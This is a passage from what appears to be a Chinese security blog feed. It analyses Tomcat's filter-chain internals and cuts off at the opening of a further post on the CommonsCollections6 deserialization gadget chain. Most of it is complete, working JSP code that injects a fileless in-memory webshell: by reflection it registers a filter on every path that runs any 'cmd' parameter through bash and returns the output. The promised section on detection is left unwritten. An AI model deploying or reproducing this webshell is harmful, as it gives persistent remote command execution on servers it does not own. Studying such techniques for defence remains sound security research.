class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>MyFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>com.example.Tomcat.FilterDemo<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>MyFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>访问web项目的任何路径都会触发：</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/2.png"></p><h2 id="3-程序组装FIlter涉及的核心类"><a href="#3-程序组装FIlter涉及的核心类" class="headerlink" title="3.程序组装FIlter涉及的核心类"></a>3.程序组装FIlter涉及的核心类</h2><p>如下也是摘自seebug的文章<a href="https://paper.seebug.org/1441/#1jsp-webshell">https://paper.seebug.org/1441/#1jsp-webshell</a></p><ul><li><strong>Filter</strong>过滤器接口一个 Filter 程序就是一个 Java 类，这个类必须实现 Filter 接口。javax.servlet.Filter 接口中定义了三个方法：init(Web 容器创建 Filter 的实例对象后，将立即调用该 Filter 对象的 init 方法)、doFilter(当一个 Filter 对象能够拦截访问请求时，Servlet 容器将调用 Filter 对象的 doFilter 方法)、destory(该方法在 Web 容器卸载 Filter 对象之前被调用)。</li><li><strong>FilterChain</strong>过滤器链 FilterChain 对象中有一个 doFilter() 方法，该方法的作用是让 Filter 链上的当前过滤器放行，使请求进入下一个 Filter.Filter和FilterChain密不可分, Filter可以实现依次调用正是因为有了FilterChain</li><li><strong>FilterConfig</strong>过滤器的配置,与普通的 Servlet 程序一样，Filter 程序也很可能需要访问 Servlet 容器。Servlet 规范将代表 ServletContext 对象和 Filter 的配置参数信息都封装到一个称为 FilterConfig 的对象中。FilterConfig 接口则用于定义 FilterConfig 对象应该对外提供的方法，以便在 Filter 程序中可以调用这些方法来获取 ServletContext 对象，以及获取在 web.xml 文件中为 Filter 设置的友好名称和初始化参数。</li><li><strong>FilterDef</strong>过滤器的配置和描述</li><li><strong>ApplicationFilterChain</strong>调用过滤器链</li><li><strong>ApplicationFilterConfig</strong>获取过滤器</li><li><strong>ApplicationFilterFactory</strong>组装过滤器链</li></ul><p>还有几个比较重要的类</p><ul><li><strong>WebXml</strong>从名字我们可以就看出来这个一个存放web.xml中内容的类</li><li><strong>ContextConfig</strong>一个web应用的上下文配置类</li><li><strong>StandardContext</strong>一个web应用上下文(Context接口)的标准实现</li><li><strong>StandardWrapperValve</strong>一个标准Wrapper的实现。一个上下文一般包括一个或者多个包装器，每一个包装器表示一个servlet。</li></ul><h2 id="4-源码分析"><a href="#4-源码分析" class="headerlink" title="4.源码分析"></a>4.源码分析</h2><p>​    我们将关注点放在<code>StandardWrapperValve</code>，因为在这里会进行过滤器的组装操作，有助于我们理解FIlter创建和调用的流程以及内存马的原理。</p><p>​    首先会先创建一个应用过滤器链：</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/3.png"></p><p>跟进<code>ApplicationFilterChain#createFilterChain</code>方法：</p><p>我们查看红框处的代码，首先会调用<code>getParent</code>获取当前<code>Context</code>实例，然后在从<code>Context</code>中找到<code>filterMaps</code>。</p><p>其中，还可以发现<code>filterMaps</code>里存放着我们过滤器的在web.xml中的配置。</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/4.png"></p><p>​    发现会遍历<code>FilterMaps</code>中的 <code>FilterMap</code>，如果发现符合当前请求 <code>url</code> 与<code>FilterMap</code>中的 <code>urlPattern</code> 想匹配，就会进入 if 判断语句：调用 <code>findFilterConfig </code>法在<code>filterConfigs</code>中寻找对应 <code>filterName</code>名称的 <code>FilterConfig</code></p><p>我在<code>web.xml</code>中对<code>urlPattern</code>的配置是使用通配符的<code>/*</code>，所以会进入到第一个判断语句：</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/5.png"></p><p>如果找到对应名称的<code>filterName</code>的<code>FilterConfig</code>，就会进入到第二个if判断语句：将 <code>filterConfig</code> 添加到 <code>filterChain</code>中。</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/6.png"></p><p>​    最后<code> filterChain</code> 组装完毕，重新回到 <code>StandardContextValue </code>中，调用<code> filterChain</code> 的 <code>doFilter </code>方法 ，就会依次调用 Filter 链上的<code> doFilter</code>方法</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/7.png"></p><p>跟进<code>doFilter</code>方法：</p><p>发现会调用<code>internalDoFilter</code>方法</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/8.png"></p><p>跟进<code>internalDoFilter</code>方法：</p><p>发现会依次从 filters 中取出 <code>filterConfig</code>，然后会调用 <code>getFilter() </code>将 filter 从<code>filterConfig </code>中取出，调用 filter 的 <code>doFilter</code>方法。从而调用我们自定义过滤器中的 doFilter 方法，从而触发了相应的代码。</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/9.png"></p><p>最后放一张蛋黄师傅（宽字节安全）绘制的图：</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/10.png"></p><p>总结：</p><ol><li>根据请求的 URL 从 <code>FilterMaps </code>中找出与之 URL 对应的 Filter 名称。</li><li>根据 Filter 名称去<code>FilterConfigs</code>中寻找对应名称的 <code>FilterConfig</code>。</li><li>找到对应的 <code>FilterConfig </code>之后添加到 <code>FilterChain</code>中，并且返回 <code>FilterChain。</code></li><li><code>filterChain </code>中调用 <code>internalDoFilter </code>遍历获取 chain 中的<code> FilterConfig</code> ，然后从 <code>FilterConfig </code>中获取 Filter，然后调用 Filter 的<code>doFilter</code>方法。</li></ol><h2 id="5-内存马注入"><a href="#5-内存马注入" class="headerlink" title="5.内存马注入"></a>5.内存马注入</h2><p>​    从前面的的分析，可以发现程序在创建过滤器链的时候，关注一下context变量，也就是<code>StandardContext</code>。就会发现它有三个和<code>filter</code>有关的成员变量。</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/11.png"></p><blockquote><ul><li><code>filterConfigs</code>：<code>filterConfig</code>的数组 <code>filterconfig</code>里面有<code>filterdef </code>以及filter对象。</li><li><code>filterDefs</code>：<code>filterRef</code>的数组 <code>FilterDef</code>的作用主要为描述filter的字符串名称与Filter实例的关系。</li><li><code>filterMaps</code>：<code>filterMap</code>的数组(<code>FilterMap</code>中存放了所有filter相关的信息包括<code>filterName</code>和<code>urlPattern</code>。有了这些之后，使用<code>matchFiltersURL</code>函数将每个filter和当前URL进行匹配，匹配成功的通过) <code>filterConfig</code>我们看过，这里注意，<code>filterConfig.filterRef</code>实际和<code>context.filterRef</code>指向的地址一样，也就是同一个东西。</li></ul></blockquote><p>如果我们能够修改这三个变量，或许就能达到利用<code>Filter</code>执行内存注入的操作（达到模拟web.xml的操作）</p><p>大致流程如下：</p><ol><li>获取context</li><li>创建一个恶意 Filter</li><li>利用 FilterDef 对 Filter 进行一个封装</li><li>将 FilterDef 添加到 FilterDefs 和 FilterConfig</li><li>创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）</li></ol><h3 id="1-首先尝试获取context"><a href="#1-首先尝试获取context" class="headerlink" title="1.首先尝试获取context"></a>1.首先尝试获取context</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">ServletContext servletContext = request.getSession().getServletContext();<br>    Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// ApplicationContext 为 ServletContext 的实现类</span><br>    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);<br><br>    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 这样我们就获取到了 context </span><br>    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<br></code></pre></td></tr></table></figure><h3 id="2-创建恶意Filter"><a href="#2-创建恶意Filter" class="headerlink" title="2.创建恶意Filter"></a>2.创建恶意Filter</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><br>Field Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>Configs.setAccessible(<span class="hljs-keyword">true</span>);<br>Map filterConfigs = (Map) Configs.get(standardContext);<br><br><span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-keyword">null</span>)&#123;<br>    Filter filter = <span class="hljs-keyword">new</span> Filter() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br>            HttpServletRequest req = (HttpServletRequest) servletRequest;<br>            <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>                Process process = <span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                <span class="hljs-keyword">int</span> len = process.getInputStream().read(bytes);<br>                servletResponse.getWriter().write(<span class="hljs-keyword">new</span> String(bytes,<span class="hljs-number">0</span>,len));<br>                process.destroy();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            filterChain.doFilter(servletRequest,servletResponse);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>        &#125;<br><br>    &#125;;<br><br><br>    FilterDef filterDef = <span class="hljs-keyword">new</span> FilterDef();<br>    filterDef.setFilter(filter);<br>    filterDef.setFilterName(name);<br>    filterDef.setFilterClass(filter.getClass().getName());<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 将filterDef添加到filterDefs中</span><br><span class="hljs-comment">     */</span><br>    standardContext.addFilterDef(filterDef);<br><br>    FilterMap filterMap = <span class="hljs-keyword">new</span> FilterMap();<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setFilterName(name);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><br>    standardContext.addFilterMapBefore(filterMap);<br><br>    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br><br>    filterConfigs.put(name,filterConfig);<br>    out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="3-完整代码"><a href="#3-完整代码" class="headerlink" title="3.完整代码"></a>3.完整代码</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;<br>&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br><br>&lt;%<br>    <span class="hljs-keyword">final</span> String name = <span class="hljs-string">&quot;reader-l&quot;</span>;<br>    ServletContext servletContext = request.getSession().getServletContext();<br><br>    Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-keyword">true</span>);<br>    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);<br><br>    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-keyword">true</span>);<br>    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<br><br>    Field Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-keyword">true</span>);<br>    Map filterConfigs = (Map) Configs.get(standardContext);<br><br>    <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-keyword">null</span>)&#123;<br>        Filter filter = <span class="hljs-keyword">new</span> Filter() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br>                HttpServletRequest req = (HttpServletRequest) servletRequest;<br>                <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-keyword">null</span>)&#123;<br>                    <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>                    Process process = <span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                    <span class="hljs-keyword">int</span> len = process.getInputStream().read(bytes);<br>                    servletResponse.getWriter().write(<span class="hljs-keyword">new</span> String(bytes,<span class="hljs-number">0</span>,len));<br>                    process.destroy();<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                filterChain.doFilter(servletRequest,servletResponse);<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>            &#125;<br><br>        &#125;;<br><br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 创建一个FilterDef 然后设置我们filterDef的名字，和类名，以及类</span><br><span class="hljs-comment">         */</span><br>        FilterDef filterDef = <span class="hljs-keyword">new</span> FilterDef();<br>        filterDef.setFilter(filter);<br>        filterDef.setFilterName(name);<br>        filterDef.setFilterClass(filter.getClass().getName());<br><br>        <span class="hljs-comment">// 调用 addFilterDef 方法将 filterDef 添加到 filterDefs中</span><br>        standardContext.addFilterDef(filterDef);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 创建一个filtermap</span><br><span class="hljs-comment">         * 设置filter的名字和对应的urlpattern</span><br><span class="hljs-comment">         */</span><br>        FilterMap filterMap = <span class="hljs-keyword">new</span> FilterMap();<br>        filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>        filterMap.setFilterName(name);<br>            <span class="hljs-comment">// 这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</span><br>        filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 将filtermap 添加到 filterMaps 中的第一个位置</span><br><span class="hljs-comment">         */</span><br>        standardContext.addFilterMapBefore(filterMap);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 利用反射创建 FilterConfig，并且将 filterDef 和 standardCtx（即 Context）作为参数进行传入</span><br><span class="hljs-comment">         */</span><br>        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 将 name 和 filterConfig 作为 key-value进行传入</span><br><span class="hljs-comment">         */</span><br>        filterConfigs.put(name,filterConfig);<br>        out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>访问evil.jsp，显示注入成功：</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/12.png"></p><p>而后访问任何路径，并且传入参数<code>cmd</code>就可以：</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/13.png"></p><h3 id="4-Tomcat版本不同导致的坑点"><a href="#4-Tomcat版本不同导致的坑点" class="headerlink" title="4.Tomcat版本不同导致的坑点"></a>4.Tomcat版本不同导致的坑点</h3><p>这问题我搞了好久。。。。。</p><p>感谢这篇文章给的提示：<a href="https://www.kitsch.live/2021/04/17/webshell%E2%91%A1%E7%94%A8servlet%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8E%E5%86%85%E5%AD%98%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6webshell/">https://www.kitsch.live/2021/04/17/webshell%E2%91%A1%E7%94%A8servlet%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8E%E5%86%85%E5%AD%98%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6webshell/</a></p><p>坑：<br>tomcat 7 与 tomcat 8 在 FilterDef 和 FilterMap 这两个类所属的包名不一样<br>tomcat 7:</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/14.png"></p><p>tomcat8：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.descriptor</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.FilterDef</span>;<br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.descriptor</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.FilterMap</span>;<br></code></pre></td></tr></table></figure><h1 id="4-内存马的排查"><a href="#4-内存马的排查" class="headerlink" title="4.内存马的排查"></a>4.内存马的排查</h1><p>这一点后面在写。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    在现在防护软件的越来越智能化以及开发人员、运维人员等IT行业人员的安全意识越来越高，传统的文件shell大多都气数</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全-CommonsCollections6利用链分析</title>
    <link href="https://reader-l.github.io/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>https://reader-l.github.io/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2021-04-27T11:47:20.000Z</published>
    <updated>2021-04-27T14:22:36.157Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    本篇文章我并不打算直接按照<code>ysoserial</code>中的代码进⾏讲解，原因是<code>ysoserial</code>的代码过于复杂了，我打算直接用P牛在代码审计星球里的《Java安全漫谈 - 12.反序列化篇(6)》里的代码来进行分析学习。</p><p>​    同时我们之前学习的<code>CommonsCollections1</code>利用链一直有高版本利用不了的问题，而<code>CommonsCollections6</code>利用链就显得比较通用，而且利用链也是基于<code>LazyMap#get()</code>的，也就是基于<code>CommonsCollections1</code>。克服高版本问题的方法，<strong>不过是在找是否还有其他调⽤ <code>LazyMap#get() </code>的地⽅。</strong></p><h1 id="2-利用链"><a href="#2-利用链" class="headerlink" title="2.利用链"></a>2.利用链</h1><p>如下利用链是P牛的简化<code>POC</code>的利用链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> Gadget chain:</span><br><span class="hljs-comment"> java.io.ObjectInputStream.readObject()</span><br><span class="hljs-comment"> java.util.HashMap.readObject()</span><br><span class="hljs-comment"> java.util.HashMap.hash()</span><br><span class="hljs-comment"> </span><br><span 